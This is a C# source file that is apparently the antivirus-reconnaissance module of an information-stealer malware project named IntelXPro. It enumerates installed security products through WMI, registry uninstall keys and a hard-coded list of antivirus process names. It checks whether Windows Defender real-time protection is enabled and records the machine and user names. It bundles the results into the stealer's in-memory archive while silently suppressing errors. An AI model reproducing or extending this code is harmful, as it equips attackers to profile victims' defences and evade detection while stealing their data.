using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Stealer;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Text;

namespace IntelXPro.src.IntelXPro.Stealer.General
{
    internal class AntiVirus : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            try
            {
                List<string> antivirusList = new List<string>();
                antivirusList.Add("[Installed AntiVirus]");
                antivirusList.Add($"Scan Date: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
                antivirusList.Add($"Computer: {Environment.MachineName}");
                antivirusList.Add($"User: {Environment.UserName}");
                antivirusList.Add("");

                DetectWmiAntivirus(antivirusList);
                DetectRegistryAntivirus(antivirusList);
                DetectWindowsDefender(antivirusList);
                DetectCommonAntivirus(antivirusList);

                if (antivirusList.Count <= 5)
                {
                    antivirusList.Add("No antivirus software detected.");
                }

                string antivirusReport = string.Join("\n", antivirusList);
                zip.AddTextFile("AntiVirus.txt", antivirusReport);
            }
            catch { }
        }

        private void DetectWmiAntivirus(List<string> antivirusList)
        {
            try
            {
                antivirusList.Add("[WMI Security Center Detection]");
                
                using (var searcher = new ManagementObjectSearcher(@"\root\SecurityCenter2", "SELECT * FROM AntiVirusProduct"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string displayName = obj["displayName"]?.ToString() ?? "Unknown";
                        string state = obj["productState"]?.ToString() ?? "Unknown";
                        antivirusList.Add($"  - {displayName} (State: {state})");
                    }
                }
            }
            catch
            {
                try
                {
                    using (var searcher = new ManagementObjectSearcher(@"\root\SecurityCenter", "SELECT * FROM AntiVirusProduct"))
                    {
                        foreach (ManagementObject obj in searcher.Get())
                        {
                            string displayName = obj["displayName"]?.ToString() ?? "Unknown";
                            antivirusList.Add($"  - {displayName}");
                        }
                    }
                }
                catch
                {
                    antivirusList.Add("  - WMI query failed");
                }
            }
            antivirusList.Add("");
        }

        private void DetectRegistryAntivirus(List<string> antivirusList)
        {
            try
            {
                antivirusList.Add("[Registry Detection]");
                
                string[] registryPaths = {
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                    @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
                };

                string[] antivirusKeywords = {
                    "antivirus", "anti-virus", "security", "defender", "norton", "mcafee", 
                    "kaspersky", "avast", "avg", "bitdefender", "eset", "trend", "sophos",
                    "malwarebytes", "webroot", "avira", "panda", "f-secure", "comodo"
                };

                foreach (string regPath in registryPaths)
                {
                    try
                    {
                        using (var key = Registry.LocalMachine.OpenSubKey(regPath))
                        {
                            if (key != null)
                            {
                                foreach (string subKeyName in key.GetSubKeyNames())
                                {
                                    try
                                    {
                                        using (var subKey = key.OpenSubKey(subKeyName))
                                        {
                                            if (subKey != null)
                                            {
                                                string displayName = subKey.GetValue("DisplayName")?.ToString() ?? "";
                                                string publisher = subKey.GetValue("Publisher")?.ToString() ?? "";
                                                
                                                if (antivirusKeywords.Any(keyword => 
                                                    displayName.ToLower().Contains(keyword) || 
                                                    publisher.ToLower().Contains(keyword)))
                                                {
                                                    antivirusList.Add($"  - {displayName} ({publisher})");
                                                }
                                            }
                                        }
                                    }
                                    catch { }
                                }
                            }
                        }
                    }
                    catch { }
                }
            }
            catch { }
            antivirusList.Add("");
        }

        private void DetectWindowsDefender(List<string> antivirusList)
        {
            try
            {
                antivirusList.Add("[Windows Defender Status]");
                
                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender"))
                {
                    if (key != null)
                    {
                        antivirusList.Add("  - Windows Defender is installed");
                        
                        try
                        {
                            using (var rtpKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"))
                            {
                                if (rtpKey != null)
                                {
                                    var rtpEnabled = rtpKey.GetValue("DisableRealtimeMonitoring");
                                    if (rtpEnabled != null && rtpEnabled.ToString() == "0")
                                    {
                                        antivirusList.Add("    * Real-time protection: ENABLED");
                                    }
                                    else
                                    {
                                        antivirusList.Add("    * Real-time protection: DISABLED");
                                    }
                                }
                            }
                        }
                        catch { }
                    }
                    else
                    {
                        antivirusList.Add("  - Windows Defender not found");
                    }
                }
            }
            catch { }
            antivirusList.Add("");
        }

        private void DetectCommonAntivirus(List<string> antivirusList)
        {
            try
            {
                antivirusList.Add("[Process Detection]");
                
                string[] antivirusProcesses = {
                    "avp.exe", "avpui.exe", "ksde.exe", "ksdeui.exe", // Kaspersky
                    "avgui.exe", "avgsvc.exe", "avgidsagent.exe", // AVG
                    "avastui.exe", "avastsvc.exe", "avastbrowser.exe", // Avast
                    "bdagent.exe", "updatesrv.exe", "vsserv.exe", // Bitdefender
                    "egui.exe", "ekrn.exe", "eguiproxy.exe", // ESET
                    "ccsvchst.exe", "nis.exe", "norton.exe", // Norton
                    "mcshield.exe", "vstskmgr.exe", "mcagent.exe", // McAfee
                    "mbamservice.exe", "mbamtray.exe", "malwarebytes.exe", // Malwarebytes
                    "wrsa.exe", "wrsvc.exe", "webroot.exe", // Webroot
                    "avcenter.exe", "avguard.exe", "avgnt.exe", // Avira
                    "psanhost.exe", "psuaservice.exe", "panda.exe", // Panda
                    "fshoster32.exe", "fssm32.exe", "fsguiexe.exe", // F-Secure
                    "cfp.exe", "cmdagent.exe", "comodo.exe" // Comodo
                };

                var runningProcesses = System.Diagnostics.Process.GetProcesses();
                var detectedAv = new List<string>();

                foreach (var process in runningProcesses)
                {
                    try
                    {
                        string processName = process.ProcessName.ToLower() + ".exe";
                        if (antivirusProcesses.Any(av => av.ToLower() == processName))
                        {
                            detectedAv.Add($"  - {process.ProcessName} (PID: {process.Id})");
                        }
                    }
                    catch { }
                }

                if (detectedAv.Count > 0)
                {
                    antivirusList.AddRange(detectedAv.Distinct());
                }
                else
                {
                    antivirusList.Add("  - No known antivirus processes detected");
                }
            }
            catch { }
        }
    }
}